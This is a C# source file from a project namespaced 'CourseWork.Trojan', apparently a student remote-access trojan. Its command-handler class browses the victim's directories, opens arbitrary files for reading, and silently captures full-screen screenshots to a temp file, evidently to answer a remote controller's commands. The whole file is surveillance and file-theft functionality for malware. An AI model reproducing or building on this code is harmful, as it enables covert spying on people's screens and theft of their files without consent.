using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Point = System.Drawing.Point;
using Size = System.Drawing.Size;
using System.Drawing.Imaging;
using System.Windows.Media.Imaging;

namespace CourseWork.Trojan
{
    internal static class CommandReaction
    {
        static public string CurrentDirectory { get; private set; } = Environment.CurrentDirectory;

        static public string[] GetDirectoryContent()
        {
            List<string> directoryContent = new List<string>();

            directoryContent.AddRange(Directory.GetFiles(CurrentDirectory));
            directoryContent.AddRange(Directory.GetDirectories(CurrentDirectory));

            for (int file = 0; file < directoryContent.Count; file++)
            {
                directoryContent[file] = CutPath(directoryContent[file]);
            }

            return directoryContent.ToArray();
        }

        static public string GoToFolder(string folder)
        {
            string newPath = CurrentDirectory + "\\" + folder;
            return Directory.Exists(newPath) ? newPath 
                : CurrentDirectory;
        }

        static public string BackToFolder()
        {
            string[] currentPath = CurrentDirectory.Split('\\');
            string newPath = "";

            for (int directory = 0; directory < currentPath.Length - 2; directory++)
            {
                newPath += (directory != currentPath.Length - 2) ? currentPath[directory] + "\\"
                    : currentPath[directory];
            }

            return Directory.Exists(newPath) ? newPath
                : CurrentDirectory;
        }

        static public Stream ReadFile(string name)
        {
            return File.OpenRead(CurrentDirectory + "\\" + name);
        }

        static public bool FindFileInCurrentDirectory(string file)
        {
            return File.Exists(CurrentDirectory + "\\" + file);
        }

        static public string GetScreenshotPath()
        {
            Rectangle rect = new Rectangle(new Point(0, 0),
                new Size((int)SystemParameters.PrimaryScreenWidth, (int)SystemParameters.PrimaryScreenHeight));

            BitmapImageToBitmap(CaptureRect(rect, ImageFormat.Png)).Save(Path.GetTempPath() + "screen.jpg", ImageFormat.Jpeg);
            return Path.GetTempPath() + "screen.jpg";
        }

        static private BitmapImage CaptureRect(Rectangle rect, ImageFormat format)
        {
            using (var ms = new MemoryStream())
            {
                using (Bitmap bitmap = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppRgb))
                {
                    using (Graphics graphics = Graphics.FromImage(bitmap))
                    {
                        graphics.CopyFromScreen(rect.X, rect.Y, 0, 0, rect.Size, CopyPixelOperation.SourceCopy);
                    }
                    bitmap.Save(ms, format);
                }
                var image = new BitmapImage();
                image.BeginInit();
                image.CacheOption = BitmapCacheOption.OnLoad;
                image.StreamSource = ms;
                image.EndInit();
                return image;
            }
        }

        static private Bitmap BitmapImageToBitmap(BitmapImage bitmapSource)
        {
            using (MemoryStream outstream = new MemoryStream())
            {
                BitmapEncoder enc = new PngBitmapEncoder();
                enc.Frames.Add(BitmapFrame.Create(bitmapSource));
                enc.Save(outstream);
                return new Bitmap(outstream);
            }
        }

        static private string CutPath(string path)
        {
            string[] pathSplit = path.Split('\\');
            return pathSplit[pathSplit.Length - 1];
        }
    }
}
